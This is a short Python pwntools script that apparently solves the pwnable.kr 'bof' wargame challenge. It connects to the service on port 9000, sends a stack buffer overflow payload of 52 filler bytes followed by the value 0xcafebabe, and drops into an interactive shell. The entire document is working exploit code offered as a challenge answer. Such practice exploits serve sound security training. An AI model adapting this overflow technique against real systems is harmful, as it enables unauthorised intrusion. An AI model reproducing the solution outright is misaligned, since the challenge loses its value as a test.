from pwn import *

context.log_level = 'debug'

conn = remote('pwnable.kr', 9000)

payload = b'\x61'*52 + b'\xbe\xba\xfe\xca'

conn.sendline(payload)

conn.interactive()

